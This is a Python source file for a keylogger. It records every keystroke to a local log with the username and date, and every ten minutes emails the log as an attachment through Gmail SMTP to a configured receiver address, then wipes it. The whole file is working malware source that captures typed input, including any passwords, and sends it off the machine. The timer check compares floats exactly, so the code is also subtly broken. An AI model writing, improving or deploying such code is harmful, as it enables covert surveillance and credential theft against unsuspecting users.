import pynput, time, threading, os, smtplib, ssl, getpass

from datetime import datetime # Display the date the log is made.
from pynput.keyboard import Key, Listener
from threading import Thread
from email.mime.multipart import MIMEMultipart # Creates a Email object.
from email.mime.text import MIMEText # For text.
from email.mime.application import MIMEApplication # For File Attachment

# Email information.

EMAILID = "EMAIL" # REPLACE
EMAILPASS = "PASS" # REPLACE
TOEMAIL = "RECEIVER" # REPLACE

CYCLE = 60 * 10 # Time interval to Email and Clean Logs. (10 Minutes)
FILENAME = "log.txt" # Filename.
finished = False # Global Track to see if Log is finished.
ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' ', Key.esc: ' [esc] '} # Dict Containing Non-alpha keys.

# Key Press.
def on_press(key):

    text = None
    # Different Write Based on Key Pressed.
    if hasattr(key, 'char'):
        text = key.char
    elif key in ReplaceCode:
        text = ReplaceCode[key]
    elif key == Key.backspace: # Remove last character in file if backspace was read.
        with open(FILENAME, 'rb+') as file:
            try: #Only delete last character if the text file has text.
                file.seek(-1, os.SEEK_END)
                file.truncate()
                pass
            except Exception: # Otherwise exception is found.
                print("No content to be deleted in the file.\n")

    # Write to file if text is valid.
    if text != None:
        write_file(FILENAME, text)

def on_release(key):
    # Stops Log Execution if Esc is pressed.
    if key == Key.esc:
        return False

def IntervalEmailandCls():

    StartTime = time.time() # Start Timer at when thread starts.
    global finished

    while (finished == False):
        ElapsedTime = time.time() - StartTime
        if (ElapsedTime == CYCLE): # If 10 minutes has passed.
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
    
                server.starttls() # secure connection.  --> encrypts all info beyond this point.
                
                server.login(EMAILID, EMAILPASS) # Logins to account.
                # EMAIL OBJECT
                email = MIMEMultipart()
                email['From'] = EMAILID
                email['To'] = TOEMAIL
                email['Subject'] = "Log from {0}".format(str(datetime.now()))

                # TEXT FILE
                logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
                logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
                email.attach(logFile) # Attach the file to the email.

                email.attach(MIMEText('Contains the all key logs from user {0} on {1}'.format(getpass.getuser(),str(datetime.now().replace(microsecond=0))))) # Retrieves UserID from env var of system.

                server.sendmail(EMAILID, TOEMAIL, email.as_string()) # Sends it as a string form.

            except Exception as E:
                print(str(E)) # Error detected i.e. Login failed.
            finally:
                server.quit() # Close the connection.

            clean_file(FILENAME)
            StartTime = time.time() # Reset Start Time.

# Clears the file.
def clean_file(file):
    recreate_file(file)
    print("\nFILE IS CLEANED AND SENT.\n")

# Writes to the file.
def write_file(file, input):
    with open(file, 'a') as file:
        file.write(input)

def recreate_file(file):
    with open(file, 'w') as file:
        file.write("User: {0} | Date: {1} \n".format(getpass.getuser(), datetime.now().replace(microsecond=0))) # Initialize File with Userid and Date.

# Function to retrieve Key presses.
def StartLog():

    global finished # Finish to stop scheduled cleaning and sending of file.

    # Create a new file to write to.
    recreate_file(FILENAME)

    # Create Keyboard Listener.
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        if not listener.running:  # If Listener is no longer running, it is finished.
            finished = True
            print("\nFinished.\n")

# Execute if it is the main module.
if __name__ == "__main__":

    # Executing both Cleanup Interval and Main method simultaneously.
    Thread(target=StartLog).start()  # Keeps reading keystrokes while esc not pressed.
    Thread(target=IntervalEmailandCls).start() # Tracks time to before cleaning and sending the text file.